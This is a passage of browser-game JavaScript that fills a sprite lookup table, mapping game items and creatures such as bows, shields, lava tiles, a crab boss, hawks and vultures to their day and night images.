      sprite[Ie.DIAMOND_SHIELD] = [];
      sprite[Ie.DIAMOND_SHIELD][Ie.DAY] = IMAGES.DIAMOND_SHIELDD;
      sprite[Ie.DIAMOND_SHIELD][Ie.NIGHT] = IMAGES.DIAMOND_SHIELDN;
      sprite[Ie.AMETHYST_SHIELD] = [];
      sprite[Ie.AMETHYST_SHIELD][Ie.DAY] = IMAGES.AMETHYST_SHIELDD;
      sprite[Ie.AMETHYST_SHIELD][Ie.NIGHT] = IMAGES.AMETHYST_SHIELDN;
      sprite[Ie.REIDITE_SHIELD] = [];
      sprite[Ie.REIDITE_SHIELD][Ie.DAY] = IMAGES.REIDITE_SHIELDD;
      sprite[Ie.REIDITE_SHIELD][Ie.NIGHT] = IMAGES.REIDITE_SHIELDN;
      sprite[Ie.WOOD_ARROW] = [];
      sprite[Ie.WOOD_ARROW][Ie.DAY] = IMAGES.WOOD_ARROWD;
      sprite[Ie.WOOD_ARROW][Ie.NIGHT] = IMAGES.WOOD_ARROWN;
      sprite[Ie.WOOD_BOW] = [];
      sprite[Ie.WOOD_BOW][Ie.DAY] = IMAGES.WOOD_BOWD;
      sprite[Ie.WOOD_BOW][Ie.NIGHT] = IMAGES.WOOD_BOWN;
      sprite[Ie.STONE_ARROW] = [];
      sprite[Ie.STONE_ARROW][Ie.DAY] = IMAGES.STONE_ARROWD;
      sprite[Ie.STONE_ARROW][Ie.NIGHT] = IMAGES.STONE_ARROWN;
      sprite[Ie.STONE_BOW] = [];
      sprite[Ie.STONE_BOW][Ie.DAY] = IMAGES.STONE_BOWD;
      sprite[Ie.STONE_BOW][Ie.NIGHT] = IMAGES.STONE_BOWN;
      sprite[Ie.GOLD_ARROW] = [];
      sprite[Ie.GOLD_ARROW][Ie.DAY] = IMAGES.GOLD_ARROWD;
      sprite[Ie.GOLD_ARROW][Ie.NIGHT] = IMAGES.GOLD_ARROWN;
      sprite[Ie.GOLD_BOW] = [];
      sprite[Ie.GOLD_BOW][Ie.DAY] = IMAGES.GOLD_BOWD;
      sprite[Ie.GOLD_BOW][Ie.NIGHT] = IMAGES.GOLD_BOWN;
      sprite[Ie.DIAMOND_ARROW] = [];
      sprite[Ie.DIAMOND_ARROW][Ie.DAY] = IMAGES.DIAMOND_ARROWD;
      sprite[Ie.DIAMOND_ARROW][Ie.NIGHT] = IMAGES.DIAMOND_ARROWN;
      sprite[Ie.DIAMOND_BOW] = [];
      sprite[Ie.DIAMOND_BOW][Ie.DAY] = IMAGES.DIAMOND_BOWD;
      sprite[Ie.DIAMOND_BOW][Ie.NIGHT] = IMAGES.DIAMOND_BOWN;
      sprite[Ie.AMETHYST_ARROW] = [];
      sprite[Ie.AMETHYST_ARROW][Ie.DAY] = IMAGES.AMETHYST_ARROWD;
      sprite[Ie.AMETHYST_ARROW][Ie.NIGHT] = IMAGES.AMETHYST_ARROWN;
      sprite[Ie.AMETHYST_BOW] = [];
      sprite[Ie.AMETHYST_BOW][Ie.DAY] = IMAGES.AMETHYST_BOWD;
      sprite[Ie.AMETHYST_BOW][Ie.NIGHT] = IMAGES.AMETHYST_BOWN;
      sprite[Ie.REIDITE_ARROW] = [];
      sprite[Ie.REIDITE_ARROW][Ie.DAY] = IMAGES.REIDITE_ARROWD;
      sprite[Ie.REIDITE_ARROW][Ie.NIGHT] = IMAGES.REIDITE_ARROWN;
      sprite[Ie.REIDITE_BOW] = [];
      sprite[Ie.REIDITE_BOW][Ie.DAY] = IMAGES.REIDITE_BOWD;
      sprite[Ie.REIDITE_BOW][Ie.NIGHT] = IMAGES.REIDITE_BOWN;
      sprite[Ie.DRAGON_ARROW] = [];
      sprite[Ie.DRAGON_ARROW][Ie.DAY] = IMAGES.DRAGON_ARROWD;
      sprite[Ie.DRAGON_ARROW][Ie.NIGHT] = IMAGES.DRAGON_ARROWN;
      sprite[Ie.DRAGON_BOW] = [];
      sprite[Ie.DRAGON_BOW][Ie.DAY] = IMAGES.DRAGON_BOWD;
      sprite[Ie.DRAGON_BOW][Ie.NIGHT] = IMAGES.DRAGON_BOWN;
      sprite[Ie.TURBAN1] = [];
      sprite[Ie.TURBAN1][Ie.DAY] = IMAGES.TURBAN1D;
      sprite[Ie.TURBAN1][Ie.NIGHT] = IMAGES.TURBAN1N;
      sprite[Ie.TURBAN2] = [];
      sprite[Ie.TURBAN2][Ie.DAY] = IMAGES.TURBAN2D;
      sprite[Ie.TURBAN2][Ie.NIGHT] = IMAGES.TURBAN2N;
      sprite[Ie.REIDITE_PROTECTION] = [];
      sprite[Ie.REIDITE_PROTECTION][Ie.DAY] = IMAGES.REIDITE_PROTECTIOND;
      sprite[Ie.REIDITE_PROTECTION][Ie.NIGHT] = IMAGES.REIDITE_PROTECTIONN;
      sprite[Ie.GLOVES_REIDITE_PROTECTION] = [];
      sprite[Ie.GLOVES_REIDITE_PROTECTION][Ie.DAY] = IMAGES.HAND_REIDITE_PROTECTIOND;
      sprite[Ie.GLOVES_REIDITE_PROTECTION][Ie.NIGHT] = IMAGES.HAND_REIDITE_PROTECTIONN;
      sprite[Ie.LAVA_SHINGLE] = [];
      sprite[Ie.LAVA_SHINGLE][Ie.DAY] = [];
      sprite[Ie.LAVA_SHINGLE][Ie.NIGHT] = [];
      sprite[Ie.LAVA_SHINGLE][Ie.DAY].push(IMAGES.LAVA_SHINGLES0D);
      sprite[Ie.LAVA_SHINGLE][Ie.DAY].push(IMAGES.LAVA_SHINGLES1D);
      sprite[Ie.LAVA_SHINGLE][Ie.NIGHT].push(IMAGES.LAVA_SHINGLES1D);
      sprite[Ie.LAVA_SHINGLE][Ie.NIGHT].push(IMAGES.LAVA_SHINGLES1N);
      sprite[Ie.LAVA_BUBBLE] = [];
      sprite[Ie.LAVA_BUBBLE][Ie.DAY] = [];
      sprite[Ie.LAVA_BUBBLE][Ie.NIGHT] = [];
      sprite[Ie.LAVA_BUBBLE][Ie.DAY].push(IMAGES.LAVA_BUBLE0D);
      sprite[Ie.LAVA_BUBBLE][Ie.DAY].push(IMAGES.LAVA_BUBLE1D);
      sprite[Ie.LAVA_BUBBLE][Ie.DAY].push(IMAGES.LAVA_BUBLE2D);
      sprite[Ie.LAVA_BUBBLE][Ie.NIGHT].push(IMAGES.LAVA_BUBLE0N);
      sprite[Ie.LAVA_BUBBLE][Ie.NIGHT].push(IMAGES.LAVA_BUBLE1N);
      sprite[Ie.LAVA_BUBBLE][Ie.NIGHT].push(IMAGES.LAVA_BUBLE2N);
      sprite[Ie.PITCHFORK] = [];
      sprite[Ie.PITCHFORK][Ie.DAY] = IMAGES.PITCHFORKD;
      sprite[Ie.PITCHFORK][Ie.NIGHT] = IMAGES.PITCHFORKN;
      sprite[Ie.PITCHFORK2] = [];
      sprite[Ie.PITCHFORK2][Ie.DAY] = IMAGES.PITCHFORK2D;
      sprite[Ie.PITCHFORK2][Ie.NIGHT] = IMAGES.PITCHFORK2N;
      sprite[Ie.EMERALD] = [];
      sprite[Ie.EMERALD][Ie.DAY] = [];
      sprite[Ie.EMERALD][Ie.NIGHT] = [];
      sprite[Ie.EMERALD][Ie.DAY].push(IMAGES.EMERALD0D);
      sprite[Ie.EMERALD][Ie.DAY].push(IMAGES.EMERALD1D);
      sprite[Ie.EMERALD][Ie.DAY].push(IMAGES.EMERALD2D);
      sprite[Ie.EMERALD][Ie.NIGHT].push(IMAGES.EMERALD0N);
      sprite[Ie.EMERALD][Ie.NIGHT].push(IMAGES.EMERALD1N);
      sprite[Ie.EMERALD][Ie.NIGHT].push(IMAGES.EMERALD2N);
      sprite[Ie.REIDITE] = [];
      sprite[Ie.REIDITE][Ie.DAY] = [];
      sprite[Ie.REIDITE][Ie.NIGHT] = [];
      sprite[Ie.REIDITE][Ie.DAY].push(IMAGES.REIDITE0D);
      sprite[Ie.REIDITE][Ie.DAY].push(IMAGES.REIDITE1D);
      sprite[Ie.REIDITE][Ie.DAY].push(IMAGES.REIDITE2D);
      sprite[Ie.REIDITE][Ie.NIGHT].push(IMAGES.REIDITE0N);
      sprite[Ie.REIDITE][Ie.NIGHT].push(IMAGES.REIDITE1N);
      sprite[Ie.REIDITE][Ie.NIGHT].push(IMAGES.REIDITE2N);
      sprite[Ie.MAGMA] = [];
      sprite[Ie.MAGMA][Ie.DAY] = [];
      sprite[Ie.MAGMA][Ie.NIGHT] = [];
      sprite[Ie.MAGMA][Ie.DAY].push(IMAGES.MAGMA1D);
      sprite[Ie.MAGMA][Ie.DAY].push(IMAGES.MAGMA2D);
      sprite[Ie.MAGMA][Ie.DAY].push(IMAGES.MAGMA3D);
      sprite[Ie.MAGMA][Ie.DAY].push(IMAGES.MAGMA4D);
      sprite[Ie.MAGMA][Ie.DAY].push(IMAGES.MAGMA5D);
      sprite[Ie.MAGMA][Ie.DAY].push(IMAGES.MAGMA6D);
      sprite[Ie.MAGMA][Ie.NIGHT].push(IMAGES.MAGMA1N);
      sprite[Ie.MAGMA][Ie.NIGHT].push(IMAGES.MAGMA2N);
      sprite[Ie.MAGMA][Ie.NIGHT].push(IMAGES.MAGMA3N);
      sprite[Ie.MAGMA][Ie.NIGHT].push(IMAGES.MAGMA4N);
      sprite[Ie.MAGMA][Ie.NIGHT].push(IMAGES.MAGMA5N);
      sprite[Ie.MAGMA][Ie.NIGHT].push(IMAGES.MAGMA6N);
      sprite[Ie.LAVA_GROUND] = [];
      sprite[Ie.LAVA_GROUND][Ie.DAY] = [];
      sprite[Ie.LAVA_GROUND][Ie.NIGHT] = [];
      sprite[Ie.LAVA_GROUND][Ie.DAY].push(IMAGES.LAVA_GROUND1D);
      sprite[Ie.LAVA_GROUND][Ie.DAY].push(IMAGES.LAVA_GROUND2D);
      sprite[Ie.LAVA_GROUND][Ie.DAY].push(IMAGES.LAVA_GROUND3D);
      sprite[Ie.LAVA_GROUND][Ie.DAY].push(IMAGES.LAVA_GROUND4D);
      sprite[Ie.LAVA_GROUND][Ie.DAY].push(IMAGES.LAVA_GROUND5D);
      sprite[Ie.LAVA_GROUND][Ie.DAY].push(IMAGES.LAVA_GROUND6D);
      sprite[Ie.LAVA_GROUND][Ie.NIGHT].push(IMAGES.LAVA_GROUND1N);
      sprite[Ie.LAVA_GROUND][Ie.NIGHT].push(IMAGES.LAVA_GROUND2N);
      sprite[Ie.LAVA_GROUND][Ie.NIGHT].push(IMAGES.LAVA_GROUND3N);
      sprite[Ie.LAVA_GROUND][Ie.NIGHT].push(IMAGES.LAVA_GROUND4N);
      sprite[Ie.LAVA_GROUND][Ie.NIGHT].push(IMAGES.LAVA_GROUND5N);
      sprite[Ie.LAVA_GROUND][Ie.NIGHT].push(IMAGES.LAVA_GROUND6N);
      sprite[Ie.FIRE_MOB] = [];
      sprite[Ie.FIRE_MOB][Ie.DAY] = IMAGES.FIRE_MOBD;
      sprite[Ie.FIRE_MOB][Ie.NIGHT] = IMAGES.FIRE_MOBN;
      sprite[Ie.HURT_FIRE_MOB] = IMAGES.FIRE_MOB_HURT;
      sprite[Ie.MACHETE] = [];
      sprite[Ie.MACHETE][Ie.DAY] = IMAGES.MACHETED;
      sprite[Ie.MACHETE][Ie.NIGHT] = IMAGES.MACHETEN;
      sprite[Ie.BOAT] = [];
      sprite[Ie.BOAT][Ie.DAY] = IMAGES.BOATD;
      sprite[Ie.BOAT][Ie.NIGHT] = IMAGES.BOATN;
      sprite[Ie.SLED] = [];
      sprite[Ie.SLED][Ie.DAY] = IMAGES.SLEDD;
      sprite[Ie.SLED][Ie.NIGHT] = IMAGES.SLEDN;
      sprite[Ie.PLANE] = [];
      sprite[Ie.PLANE][Ie.DAY] = IMAGES.PLANED;
      sprite[Ie.PLANE][Ie.NIGHT] = IMAGES.PLANEN;
      sprite[Ie.PENGUIN] = [];
      sprite[Ie.PENGUIN][Ie.DAY] = IMAGES.PENGUIND;
      sprite[Ie.PENGUIN][Ie.NIGHT] = IMAGES.PENGUINN;
      sprite[Ie.HURT_PENGUIN] = IMAGES.HURT_PENGUIN;
      sprite[Ie.SAND_WORM1] = [];
      sprite[Ie.SAND_WORM1][Ie.DAY] = IMAGES.SAND_WORM1D;
      sprite[Ie.SAND_WORM1][Ie.NIGHT] = IMAGES.SAND_WORM1N;
      sprite[Ie.SAND_WORM2] = [];
      sprite[Ie.SAND_WORM2][Ie.DAY] = IMAGES.SAND_WORM2D;
      sprite[Ie.SAND_WORM2][Ie.NIGHT] = IMAGES.SAND_WORM2N;
      sprite[Ie.HURT_SAND_WORM0] = IMAGES.HURT_SAND_WORM0;
      sprite[Ie.HURT_SAND_WORM1] = IMAGES.HURT_SAND_WORM1;
      sprite[Ie.HURT_SAND_WORM2] = IMAGES.HURT_SAND_WORM2;
      sprite[Ie.SCORPION] = [];
      sprite[Ie.SCORPION][Ie.DAY] = IMAGES.SCORPIOND;
      sprite[Ie.SCORPION][Ie.NIGHT] = IMAGES.SCORPIONN;
      sprite[Ie.SCORPION_HAND_LEFT] = [];
      sprite[Ie.SCORPION_HAND_LEFT][Ie.DAY] = IMAGES.SCORPION_HAND_LEFTD;
      sprite[Ie.SCORPION_HAND_LEFT][Ie.NIGHT] = IMAGES.SCORPION_HAND_LEFTN;
      sprite[Ie.SCORPION_HAND_RIGHT] = [];
      sprite[Ie.SCORPION_HAND_RIGHT][Ie.DAY] = IMAGES.SCORPION_HAND_RIGHTD;
      sprite[Ie.SCORPION_HAND_RIGHT][Ie.NIGHT] = IMAGES.SCORPION_HAND_RIGHTN;
      sprite[Ie.HURT_SCORPION] = IMAGES.HURT_SCORPION;
      sprite[Ie.HURT_SCORPION_HAND_RIGHT] = IMAGES.HURT_SCORPION_HAND_RIGHT;
      sprite[Ie.HURT_SCORPION_HAND_LEFT] = IMAGES.HURT_SCORPION_HAND_LEFT;
      sprite[Ie.CRAB_BOSS_ATTACK] = [];
      sprite[Ie.CRAB_BOSS_ATTACK][Ie.DAY] = IMAGES.CRAB_BOSS_ATTACKD;
      sprite[Ie.CRAB_BOSS_ATTACK][Ie.NIGHT] = IMAGES.CRAB_BOSS_ATTACKN;
      sprite[Ie.CRAB_BOSS_TAMED] = [];
      sprite[Ie.CRAB_BOSS_TAMED][Ie.DAY] = IMAGES.CRAB_BOSS_TAMEDD;
      sprite[Ie.CRAB_BOSS_TAMED][Ie.NIGHT] = IMAGES.CRAB_BOSS_TAMEDN;
      sprite[Ie.CRAB_BOSS] = [];
      sprite[Ie.CRAB_BOSS][Ie.DAY] = IMAGES.CRAB_BOSSD;
      sprite[Ie.CRAB_BOSS][Ie.NIGHT] = IMAGES.CRAB_BOSSN;
      sprite[Ie.CRAB_BOSS_CLAW_LEFT] = [];
      sprite[Ie.CRAB_BOSS_CLAW_LEFT][Ie.DAY] = IMAGES.CRAB_BOSS_CLAW_LEFTD;
      sprite[Ie.CRAB_BOSS_CLAW_LEFT][Ie.NIGHT] = IMAGES.CRAB_BOSS_CLAW_LEFTN;
      sprite[Ie.CRAB_BOSS_CLAW_RIGHT] = [];
      sprite[Ie.CRAB_BOSS_CLAW_RIGHT][Ie.DAY] = IMAGES.CRAB_BOSS_CLAW_RIGHTD;
      sprite[Ie.CRAB_BOSS_CLAW_RIGHT][Ie.NIGHT] = IMAGES.CRAB_BOSS_CLAW_RIGHTN;
      sprite[Ie.CRAB_BOSS_CLAW_LEFT_ATTACK] = [];
      sprite[Ie.CRAB_BOSS_CLAW_LEFT_ATTACK][Ie.DAY] = IMAGES.CRAB_BOSS_CLAW_LEFT_ATTACKD;
      sprite[Ie.CRAB_BOSS_CLAW_LEFT_ATTACK][Ie.NIGHT] = IMAGES.CRAB_BOSS_CLAW_LEFT_ATTACKN;
      sprite[Ie.CRAB_BOSS_CLAW_RIGHT_ATTACK] = [];
      sprite[Ie.CRAB_BOSS_CLAW_RIGHT_ATTACK][Ie.DAY] = IMAGES.CRAB_BOSS_CLAW_RIGHT_ATTACKD;
      sprite[Ie.CRAB_BOSS_CLAW_RIGHT_ATTACK][Ie.NIGHT] = IMAGES.CRAB_BOSS_CLAW_RIGHT_ATTACKN;
      sprite[Ie.HURT_CRAB_BOSS] = IMAGES.HURT_CRAB_BOSS;
      sprite[Ie.HURT_CRAB_BOSS_CLAW_LEFT] = IMAGES.HURT_CRAB_BOSS_CLAW_LEFT;
      sprite[Ie.HURT_CRAB_BOSS_CLAW_RIGHT] = IMAGES.HURT_CRAB_BOSS_CLAW_RIGHT;
      sprite[Ie.HEAL_CRAB_BOSS] = IMAGES.HEAL_CRAB_BOSS;
      sprite[Ie.HEAL_CRAB_BOSS_CLAW_LEFT] = IMAGES.HEAL_CRAB_BOSS_CLAW_LEFT;
      sprite[Ie.HEAL_CRAB_BOSS_CLAW_RIGHT] = IMAGES.HEAL_CRAB_BOSS_CLAW_RIGHT;
      sprite[Ie.BABY_MAMMOTH_ATTACK] = [];
      sprite[Ie.BABY_MAMMOTH_ATTACK][Ie.DAY] = IMAGES.BABY_MAMMOTH_ATTACKD;
      sprite[Ie.BABY_MAMMOTH_ATTACK][Ie.NIGHT] = IMAGES.BABY_MAMMOTH_ATTACKN;
      sprite[Ie.BABY_MAMMOTH] = [];
      sprite[Ie.BABY_MAMMOTH][Ie.DAY] = IMAGES.BABY_MAMMOTHD;
      sprite[Ie.BABY_MAMMOTH][Ie.NIGHT] = IMAGES.BABY_MAMMOTHN;
      sprite[Ie.MAMMOTH] = [];
      sprite[Ie.MAMMOTH][Ie.DAY] = IMAGES.MAMMOTHD;
      sprite[Ie.MAMMOTH][Ie.NIGHT] = IMAGES.MAMMOTHN;
      sprite[Ie.BABY_MAMMOTH_TAMED] = [];
      sprite[Ie.BABY_MAMMOTH_TAMED][Ie.DAY] = IMAGES.BABY_MAMMOTH_TAMEDD;
      sprite[Ie.BABY_MAMMOTH_TAMED][Ie.NIGHT] = IMAGES.BABY_MAMMOTH_TAMEDN;
      sprite[Ie.HURT_BABY_MAMMOTH] = IMAGES.HURT_BABY_MAMMOTH;
      sprite[Ie.HURT_MAMMOTH] = IMAGES.HURT_MAMMOTH;
      sprite[Ie.BABY_DRAGON_ATTACK] = [];
      sprite[Ie.BABY_DRAGON_ATTACK][Ie.DAY] = IMAGES.BABY_DRAGON_ATTACKD;
      sprite[Ie.BABY_DRAGON_ATTACK][Ie.NIGHT] = IMAGES.BABY_DRAGON_ATTACKN;
      sprite[Ie.BABY_DRAGON] = [];
      sprite[Ie.BABY_DRAGON][Ie.DAY] = IMAGES.BABY_DRAGOND;
      sprite[Ie.BABY_DRAGON][Ie.NIGHT] = IMAGES.BABY_DRAGONN;
      sprite[Ie.BABY_DRAGON_TAMED] = [];
      sprite[Ie.BABY_DRAGON_TAMED][Ie.DAY] = IMAGES.BABY_DRAGON_TAMEDD;
      sprite[Ie.BABY_DRAGON_TAMED][Ie.NIGHT] = IMAGES.BABY_DRAGON_TAMEDN;
      sprite[Ie.BABY_DRAGON_WING_LEFT] = [];
      sprite[Ie.BABY_DRAGON_WING_LEFT][Ie.DAY] = IMAGES.BABY_DRAGON_WING_LEFTD;
      sprite[Ie.BABY_DRAGON_WING_LEFT][Ie.NIGHT] = IMAGES.BABY_DRAGON_WING_LEFTN;
      sprite[Ie.BABY_DRAGON_WING_RIGHT] = [];
      sprite[Ie.BABY_DRAGON_WING_RIGHT][Ie.DAY] = IMAGES.BABY_DRAGON_WING_RIGHTD;
      sprite[Ie.BABY_DRAGON_WING_RIGHT][Ie.NIGHT] = IMAGES.BABY_DRAGON_WING_RIGHTN;
      sprite[Ie.BABY_DRAGON_WING_LEFT_ATTACK] = [];
      sprite[Ie.BABY_DRAGON_WING_LEFT_ATTACK][Ie.DAY] = IMAGES.BABY_DRAGON_WING_LEFT_ATTACKD;
      sprite[Ie.BABY_DRAGON_WING_LEFT_ATTACK][Ie.NIGHT] = IMAGES.BABY_DRAGON_WING_LEFT_ATTACKN;
      sprite[Ie.BABY_DRAGON_WING_RIGHT_ATTACK] = [];
      sprite[Ie.BABY_DRAGON_WING_RIGHT_ATTACK][Ie.DAY] = IMAGES.BABY_DRAGON_WING_RIGHT_ATTACKD;
      sprite[Ie.BABY_DRAGON_WING_RIGHT_ATTACK][Ie.NIGHT] = IMAGES.BABY_DRAGON_WING_RIGHT_ATTACKN;
      sprite[Ie.BABY_DRAGON_WING_LEFT_TAMED] = [];
      sprite[Ie.BABY_DRAGON_WING_LEFT_TAMED][Ie.DAY] = IMAGES.BABY_DRAGON_WING_LEFT_TAMEDD;
      sprite[Ie.BABY_DRAGON_WING_LEFT_TAMED][Ie.NIGHT] = IMAGES.BABY_DRAGON_WING_LEFT_TAMEDN;
      sprite[Ie.BABY_DRAGON_WING_RIGHT_TAMED] = [];
      sprite[Ie.BABY_DRAGON_WING_RIGHT_TAMED][Ie.DAY] = IMAGES.BABY_DRAGON_WING_RIGHT_TAMEDD;
      sprite[Ie.BABY_DRAGON_WING_RIGHT_TAMED][Ie.NIGHT] = IMAGES.BABY_DRAGON_WING_RIGHT_TAMEDN;
      sprite[Ie.HURT_BABY_DRAGON] = IMAGES.HURT_BABY_DRAGON;
      sprite[Ie.HURT_BABY_DRAGON_WING_LEFT] = IMAGES.HURT_BABY_DRAGON_WING_LEFT;
      sprite[Ie.HURT_BABY_DRAGON_WING_RIGHT] = IMAGES.HURT_BABY_DRAGON_WING_RIGHT;
      sprite[Ie.BABY_LAVA_ATTACK] = [];
      sprite[Ie.BABY_LAVA_ATTACK][Ie.DAY] = IMAGES.BABY_LAVA_ATTACKD;
      sprite[Ie.BABY_LAVA_ATTACK][Ie.NIGHT] = IMAGES.BABY_LAVA_ATTACKN;
      sprite[Ie.BABY_LAVA] = [];
      sprite[Ie.BABY_LAVA][Ie.DAY] = IMAGES.BABY_LAVAD;
      sprite[Ie.BABY_LAVA][Ie.NIGHT] = IMAGES.BABY_LAVAN;
      sprite[Ie.BABY_LAVA_TAMED] = [];
      sprite[Ie.BABY_LAVA_TAMED][Ie.DAY] = IMAGES.BABY_LAVA_TAMEDD;
      sprite[Ie.BABY_LAVA_TAMED][Ie.NIGHT] = IMAGES.BABY_LAVA_TAMEDN;
      sprite[Ie.BABY_LAVA_WING_LEFT] = [];
      sprite[Ie.BABY_LAVA_WING_LEFT][Ie.DAY] = IMAGES.BABY_LAVA_WING_LEFTD;
      sprite[Ie.BABY_LAVA_WING_LEFT][Ie.NIGHT] = IMAGES.BABY_LAVA_WING_LEFTN;
      sprite[Ie.BABY_LAVA_WING_RIGHT] = [];
      sprite[Ie.BABY_LAVA_WING_RIGHT][Ie.DAY] = IMAGES.BABY_LAVA_WING_RIGHTD;
      sprite[Ie.BABY_LAVA_WING_RIGHT][Ie.NIGHT] = IMAGES.BABY_LAVA_WING_RIGHTN;
      sprite[Ie.BABY_LAVA_WING_LEFT_ATTACK] = [];
      sprite[Ie.BABY_LAVA_WING_LEFT_ATTACK][Ie.DAY] = IMAGES.BABY_LAVA_WING_LEFT_ATTACKD;
      sprite[Ie.BABY_LAVA_WING_LEFT_ATTACK][Ie.NIGHT] = IMAGES.BABY_LAVA_WING_LEFT_ATTACKN;
      sprite[Ie.BABY_LAVA_WING_RIGHT_ATTACK] = [];
      sprite[Ie.BABY_LAVA_WING_RIGHT_ATTACK][Ie.DAY] = IMAGES.BABY_LAVA_WING_RIGHT_ATTACKD;
      sprite[Ie.BABY_LAVA_WING_RIGHT_ATTACK][Ie.NIGHT] = IMAGES.BABY_LAVA_WING_RIGHT_ATTACKN;
      sprite[Ie.BABY_LAVA_WING_LEFT_TAMED] = [];
      sprite[Ie.BABY_LAVA_WING_LEFT_TAMED][Ie.DAY] = IMAGES.BABY_LAVA_WING_LEFT_TAMEDD;
      sprite[Ie.BABY_LAVA_WING_LEFT_TAMED][Ie.NIGHT] = IMAGES.BABY_LAVA_WING_LEFT_TAMEDN;
      sprite[Ie.BABY_LAVA_WING_RIGHT_TAMED] = [];
      sprite[Ie.BABY_LAVA_WING_RIGHT_TAMED][Ie.DAY] = IMAGES.BABY_LAVA_WING_RIGHT_TAMEDD;
      sprite[Ie.BABY_LAVA_WING_RIGHT_TAMED][Ie.NIGHT] = IMAGES.BABY_LAVA_WING_RIGHT_TAMEDN;
      sprite[Ie.HURT_BABY_LAVA] = IMAGES.HURT_BABY_LAVA;
      sprite[Ie.HURT_BABY_LAVA_WING_LEFT] = IMAGES.HURT_BABY_LAVA_WING_LEFT;
      sprite[Ie.HURT_BABY_LAVA_WING_RIGHT] = IMAGES.HURT_BABY_LAVA_WING_RIGHT;
      sprite[Ie.HAWK_ATTACK] = [];
      sprite[Ie.HAWK_ATTACK][Ie.DAY] = IMAGES.HAWK_ATTACKD;
      sprite[Ie.HAWK_ATTACK][Ie.NIGHT] = IMAGES.HAWK_ATTACKN;
      sprite[Ie.HAWK] = [];
      sprite[Ie.HAWK][Ie.DAY] = IMAGES.HAWKD;
      sprite[Ie.HAWK][Ie.NIGHT] = IMAGES.HAWKN;
      sprite[Ie.HURT_HAWK_GROUND] = IMAGES.HURT_HAWK_GROUND;
      sprite[Ie.HAWK_GROUND] = [];
      sprite[Ie.HAWK_GROUND][Ie.DAY] = IMAGES.HAWK_GROUNDD;
      sprite[Ie.HAWK_GROUND][Ie.NIGHT] = IMAGES.HAWK_GROUNDN;
      sprite[Ie.HAWK_GROUND_ATTACK] = [];
      sprite[Ie.HAWK_GROUND_ATTACK][Ie.DAY] = IMAGES.HAWK_GROUND_ATTACKD;
      sprite[Ie.HAWK_GROUND_ATTACK][Ie.NIGHT] = IMAGES.HAWK_GROUND_ATTACKN;
      sprite[Ie.HAWK_TAMED] = [];
      sprite[Ie.HAWK_TAMED][Ie.DAY] = IMAGES.HAWK_TAMEDD;
      sprite[Ie.HAWK_TAMED][Ie.NIGHT] = IMAGES.HAWK_TAMEDN;
      sprite[Ie.HAWK_WING_LEFT] = [];
      sprite[Ie.HAWK_WING_LEFT][Ie.DAY] = IMAGES.HAWK_WING_LEFTD;
      sprite[Ie.HAWK_WING_LEFT][Ie.NIGHT] = IMAGES.HAWK_WING_LEFTN;
      sprite[Ie.HAWK_WING_RIGHT] = [];
      sprite[Ie.HAWK_WING_RIGHT][Ie.DAY] = IMAGES.HAWK_WING_RIGHTD;
      sprite[Ie.HAWK_WING_RIGHT][Ie.NIGHT] = IMAGES.HAWK_WING_RIGHTN;
      sprite[Ie.HAWK_WING_LEFT_ATTACK] = [];
      sprite[Ie.HAWK_WING_LEFT_ATTACK][Ie.DAY] = IMAGES.HAWK_WING_LEFT_ATTACKD;
      sprite[Ie.HAWK_WING_LEFT_ATTACK][Ie.NIGHT] = IMAGES.HAWK_WING_LEFT_ATTACKN;
      sprite[Ie.HAWK_WING_RIGHT_ATTACK] = [];
      sprite[Ie.HAWK_WING_RIGHT_ATTACK][Ie.DAY] = IMAGES.HAWK_WING_RIGHT_ATTACKD;
      sprite[Ie.HAWK_WING_RIGHT_ATTACK][Ie.NIGHT] = IMAGES.HAWK_WING_RIGHT_ATTACKN;
      sprite[Ie.HAWK_WING_LEFT_TAMED] = [];
      sprite[Ie.HAWK_WING_LEFT_TAMED][Ie.DAY] = IMAGES.HAWK_WING_LEFT_TAMEDD;
      sprite[Ie.HAWK_WING_LEFT_TAMED][Ie.NIGHT] = IMAGES.HAWK_WING_LEFT_TAMEDN;
      sprite[Ie.HAWK_WING_RIGHT_TAMED] = [];
      sprite[Ie.HAWK_WING_RIGHT_TAMED][Ie.DAY] = IMAGES.HAWK_WING_RIGHT_TAMEDD;
      sprite[Ie.HAWK_WING_RIGHT_TAMED][Ie.NIGHT] = IMAGES.HAWK_WING_RIGHT_TAMEDN;
      sprite[Ie.HURT_HAWK] = IMAGES.HURT_HAWK;
      sprite[Ie.HURT_HAWK_WING_LEFT] = IMAGES.HURT_HAWK_WING_LEFT;
      sprite[Ie.HURT_HAWK_WING_RIGHT] = IMAGES.HURT_HAWK_WING_RIGHT;
      sprite[Ie.VULTURE_ATTACK] = [];
      sprite[Ie.VULTURE_ATTACK][Ie.DAY] = IMAGES.VULTURE_ATTACKD;
      sprite[Ie.VULTURE_ATTACK][Ie.NIGHT] = IMAGES.VULTURE_ATTACKN;
      sprite[Ie.VULTURE] = [];
      sprite[Ie.VULTURE][Ie.DAY] = IMAGES.VULTURED;
      sprite[Ie.VULTURE][Ie.NIGHT] = IMAGES.VULTUREN;
      sprite[Ie.HURT_VULTURE_GROUND] = IMAGES.HURT_VULTURE_GROUND;
      sprite[Ie.VULTURE_GROUND] = [];
      sprite[Ie.VULTURE_GROUND][Ie.DAY] = IMAGES.VULTURE_GROUNDD;
      sprite[Ie.VULTURE_GROUND][Ie.NIGHT] = IMAGES.VULTURE_GROUNDN;
      sprite[Ie.VULTURE_GROUND_ATTACK] = [];
      sprite[Ie.VULTURE_GROUND_ATTACK][Ie.DAY] = IMAGES.VULTURE_GROUND_ATTACKD;
      sprite[Ie.VULTURE_GROUND_ATTACK][Ie.NIGHT] = IMAGES.VULTURE_GROUND_ATTACKN;
      sprite[Ie.VULTURE_TAMED] = [];
      sprite[Ie.VULTURE_TAMED][Ie.DAY] = IMAGES.VULTURE_TAMEDD;
      sprite[Ie.VULTURE_TAMED][Ie.NIGHT] = IMAGES.VULTURE_TAMEDN;
      sprite[Ie.VULTURE_WING_LEFT] = [];
      sprite[Ie.VULTURE_WING_LEFT][Ie.DAY] = IMAGES.VULTURE_WING_LEFTD;
      sprite[Ie.VULTURE_WING_LEFT][Ie.NIGHT] = IMAGES.VULTURE_WING_LEFTN;
      sprite[Ie.VULTURE_WING_RIGHT] = [];
      sprite[Ie.VULTURE_WING_RIGHT][Ie.DAY] = IMAGES.VULTURE_WING_RIGHTD;
      sprite[Ie.VULTURE_WING_RIGHT][Ie.NIGHT] = IMAGES.VULTURE_WING_RIGHTN;
      sprite[Ie.VULTURE_WING_LEFT_ATTACK] = [];
